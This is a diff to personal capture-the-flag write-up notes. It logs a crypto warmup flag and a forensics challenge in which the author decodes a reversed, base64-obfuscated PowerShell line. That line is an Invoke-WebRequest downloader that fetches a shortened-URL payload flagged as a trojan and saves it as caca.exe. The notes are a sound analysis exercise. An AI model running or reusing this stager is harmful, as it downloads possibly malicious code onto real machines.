@@ -18,3 +18,11 @@ Genetics (Crypto | Warmup):
   Substitution Cypher lead to a string but it was incorrect (i will get this as a tattoo real soon)
   Sub Cypher was "correct" just that we needed to map each DNA-Sequence and use the Binary to create the flag
   TFCCTF{1_w1ll_g3t_th1s_4s_4_t4tt00_V3ry_s00n}
+
+HE DID WHAT? (Forensics | Medium):
+  find remote access command scripts
+=oQDiUGel5SYjF2YiASZslmR0V3TtASKpkiI90zZhFDbuJGc5MEZoVzQilnVIRWe5cUY6lTeMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1WoASayVVLgQ3clVXclJlYldVLlt2b25WS  -> reverse -> SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiYUhSMGNITTZMeTl6YUc5eWRIVnliQzVoZEM5cGJubDFhZz09IikpKSAtT3V0RmlsZSAiY2FjYS5leGUiDQo= -> base64 -> Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag=="))) -OutFile "caca.exe"
+-> base64(aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag==) -> https://shorturl.at/inyuj (Trojan warning from Windows Defender, so windows autodeleted and I'm too big of a pussy and cba to use a possible trojan for 50 Points lmao(I did write a Ticket and got reply -> https://ibb.co/Ks6LH89)supposedly harmless) 
+in Theory use it with "VHEEVH}x3uwcnad6u3eac3pvaj6tf" or rather have a look at source-code
+
+  
